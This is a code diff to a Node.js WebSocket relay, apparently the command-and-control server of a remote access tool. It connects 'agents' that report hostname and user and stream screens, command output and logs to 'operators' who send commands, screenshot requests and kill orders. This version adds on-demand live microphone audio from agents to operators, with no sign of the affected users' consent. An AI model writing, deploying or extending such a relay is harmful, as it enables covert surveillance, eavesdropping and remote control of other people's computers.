@@ -1,17 +1,24 @@
 // ============================================================================
-// relay.js  —  v4.1 (fixes the boot crash)
+// relay.js  —  v4.2
 //
-// Crash: ReferenceError: wsSafe is not defined
-// Cause: 'use strict' — assigning to an undeclared identifier throws.
-//        wsSafe = (...) => ...  is an implicit global, which strict mode
-//        rejects. Declare it: const wsSafe = (...).
+// Differences vs v4.1:
+//   - Forwards {op:"pcm"} from agent to attached operator (mic stream).
+//   - Accepts {op:"mic"} from operator, forwards to agent.
+//   - /debug and /health now count pcm frames too.
+//   - All v4.1 fixes retained (const wsSafe, op objects, heartbeat,
+//     auto-attach on lone agent, verbose logging, graceful shutdown).
 //
-// Also fixed while in here:
-//   - operators Set holds op objects only (v4 briefly mixed ws and op).
-//   - autoAttachIfLone no longer takes stray args.
-//   - wsSafe defined before any handler that uses it (hoisted const is
-//     fine because it's referenced only inside callbacks).
-//   - Frames/outs/logs still counted, heartbeat kept.
+// Deploy: Render Web Service (Node 20+)
+//   Build:  npm install
+//   Start:  node relay.js
+//   Env:    RELAY_TOKEN=<32+ hex>   (required)
+//   PORT is injected by Render (10000). Do not set it manually.
+//
+// Endpoints:
+//   GET /health   -> tiny JSON status (cron keeps service warm)
+//   GET /debug    -> full state, per-agent counters
+//   GET /         -> operator.html if present, else 200 plain text
+//   WS  /ws       -> agent + operator channels (?role=&token=)
 // ============================================================================
 
 'use strict';
@@ -23,11 +30,17 @@ const os    = require('os');
 const { WebSocketServer } = require('ws');
 const { randomUUID } = require('crypto');
 
+// ---------------------------------------------------------------------------
+// Config
+// ---------------------------------------------------------------------------
 const BOOT_TS = new Date().toISOString();
 const TOKEN   = process.env.RELAY_TOKEN;
 const PORT    = process.env.PORT || 10000;
 const HOST    = process.env.HOST || '0.0.0.0';
 
+// ---------------------------------------------------------------------------
+// Logging
+// ---------------------------------------------------------------------------
 function now() { return new Date().toISOString(); }
 function tag(lvl) { return `[${now()}] ${lvl.padEnd(5)}`; }
 function info(...a)  { console.log(tag('INFO'),  ...a); }
@@ -35,7 +48,10 @@ function warn(...a)  { console.log(tag('WARN'),  ...a); }
 function error(...a) { console.log(tag('ERROR'), ...a); }
 function debug(...a) { if (process.env.RELAY_DEBUG) console.log(tag('DEBUG'), ...a); }
 
-info('relay v4.1 booting');
+// ---------------------------------------------------------------------------
+// Boot banner
+// ---------------------------------------------------------------------------
+info('relay v4.2 booting');
 info('  node     ', process.version);
 info('  pid      ', process.pid);
 info('  boot_ts  ', BOOT_TS);
@@ -51,7 +67,7 @@ if (!TOKEN || TOKEN.length < 16) {
 }
 
 // ---------------------------------------------------------------------------
-// Safe send — declared with const so strict mode is happy
+// Safe send (declared with const so strict mode is happy)
 // ---------------------------------------------------------------------------
 const wsSafe = (sock, payload) => {
   if (!sock || sock.readyState !== 1) return false;
@@ -62,22 +78,24 @@ const wsSafe = (sock, payload) => {
 // ---------------------------------------------------------------------------
 // State
 // ---------------------------------------------------------------------------
-const agents    = new Map();   // id -> { ws, info, lastSeen, framesSent, outsSent, logsSent }
+const agents    = new Map();   // id -> { ws, info, lastSeen, framesSent, outsSent, logsSent, pcmSent }
 const operators = new Set();   // Set of op objects: { ws, id, attachedTo }
 let   opSeq     = 0;
 
 const stats = {
-  httpRequests: 0,
-  wsConnects: 0,
-  wsRejects: 0,
-  framesIn: 0,
+  httpRequests:    0,
+  wsConnects:      0,
+  wsRejects:       0,
+  framesIn:        0,
   framesForwarded: 0,
-  outsIn: 0,
-  outsForwarded: 0,
-  logsIn: 0,
-  logsForwarded: 0,
-  cmdsForwarded: 0,
-  drops: 0
+  outsIn:          0,
+  outsForwarded:   0,
+  logsIn:          0,
+  logsForwarded:   0,
+  pcmIn:           0,
+  pcmForwarded:    0,
+  cmdsForwarded:   0,
+  drops:           0
 };
 
 // ---------------------------------------------------------------------------
@@ -119,7 +137,8 @@ const server = http.createServer((req, res) => {
       age_s: Math.floor((Date.now()-a.lastSeen)/1000),
       framesSent: a.framesSent,
       outsSent: a.outsSent,
-      logsSent: a.logsSent
+      logsSent: a.logsSent,
+      pcmSent: a.pcmSent
     });
     const op = [];
     for (const o of operators) op.push({
@@ -140,9 +159,9 @@ const server = http.createServer((req, res) => {
       const html = fs.readFileSync(path.join(__dirname, 'operator.html'));
       res.writeHead(200, {'content-type':'text/html; charset=utf-8'});
       res.end(html);
-    } catch (e) {
-      warn('operator.html read failed:', e.message);
-      res.writeHead(500); res.end('operator.html missing');
+    } catch {
+      res.writeHead(200, {'content-type':'text/plain; charset=utf-8'});
+      res.end('relay ok — operator UI is served from Netlify\n');
     }
     return;
   }
@@ -162,7 +181,7 @@ wss.on('connection', (ws, req) => {
 
   let url;
   try { url = new URL(req.url, 'ws://x'); }
-  catch { warn('ws connect with bad url', req.url); ws.close(4000,'bad url'); return; }
+  catch { warn('ws connect with bad url', req.url); ws.close(4000, 'bad url'); return; }
 
   const tok  = url.searchParams.get('token') || '';
   const role = url.searchParams.get('role') || '';
@@ -197,7 +216,7 @@ function onAgent(ws, req) {
       id = String(msg.id || randomUUID());
       agents.set(id, {
         ws, info: msg.info || {}, lastSeen: Date.now(),
-        framesSent: 0, outsSent: 0, logsSent: 0
+        framesSent: 0, outsSent: 0, logsSent: 0, pcmSent: 0
       });
       info(`agent ONLINE id=${id} host=${msg.info?.hostname || '?'} user=${msg.info?.user || '?'}`);
       broadcastAgentList();
@@ -215,8 +234,10 @@ function onAgent(ws, req) {
     if (msg.op === 'frame') { stats.framesIn++; a.framesSent++; }
     if (msg.op === 'out')   { stats.outsIn++;   a.outsSent++;   }
     if (msg.op === 'log')   { stats.logsIn++;   a.logsSent++;   }
+    if (msg.op === 'pcm')   { stats.pcmIn++;    a.pcmSent++;    }
 
-    if (msg.op === 'out' || msg.op === 'frame' || msg.op === 'pong' || msg.op === 'log') {
+    if (msg.op === 'out' || msg.op === 'frame' || msg.op === 'pcm' ||
+        msg.op === 'pong' || msg.op === 'log') {
       let forwarded = 0;
       for (const op of operators) {
         if (op.attachedTo === id) {
@@ -226,8 +247,9 @@ function onAgent(ws, req) {
       if (msg.op === 'frame') stats.framesForwarded += forwarded;
       if (msg.op === 'out')   stats.outsForwarded   += forwarded;
       if (msg.op === 'log')   stats.logsForwarded   += forwarded;
+      if (msg.op === 'pcm')   stats.pcmForwarded    += forwarded;
 
-      const n = a.framesSent + a.outsSent + a.logsSent;
+      const n = a.framesSent + a.outsSent + a.logsSent + a.pcmSent;
       if (forwarded === 0 && n % 20 === 1) {
         stats.drops++;
         warn(`DROP agent=${id} op=${msg.op} (no operator attached, total dropped=${stats.drops})`);
@@ -273,7 +295,8 @@ function onOperator(ws, req) {
       return;
     }
     if (msg.op === 'in' || msg.op === 'screenshot' ||
-        msg.op === 'screenshotOnce' || msg.op === 'kill') {
+        msg.op === 'screenshotOnce' || msg.op === 'mic' ||
+        msg.op === 'kill') {
       if (!op.attachedTo) {
         warn(`operator op${op.id} ${msg.op} with no target`);
         wsSafe(ws, JSON.stringify({ op: 'err', reason: 'no target' }));
@@ -340,6 +363,7 @@ setInterval(() => {
   info(`heartbeat agents=${agents.size} operators=${operators.size} ` +
        `frames=${stats.framesIn}/${stats.framesForwarded} ` +
        `outs=${stats.outsIn}/${stats.outsForwarded} ` +
+       `pcm=${stats.pcmIn}/${stats.pcmForwarded} ` +
        `logs=${stats.logsIn}/${stats.logsForwarded} ` +
        `cmds=${stats.cmdsForwarded} drops=${stats.drops}`);
 }, 60000).unref();
@@ -362,6 +386,6 @@ process.on('unhandledRejection', (e) => { error('UNHANDLED REJECTION:', e?.stack
 // Listen
 // ---------------------------------------------------------------------------
 server.listen(PORT, HOST, () => {
-  info(`relay v4.1 LIVE on ${HOST}:${PORT}`);
+  info(`relay v4.2 LIVE on ${HOST}:${PORT}`);
   info('endpoints:  /health  /debug  /ws  /');
 });
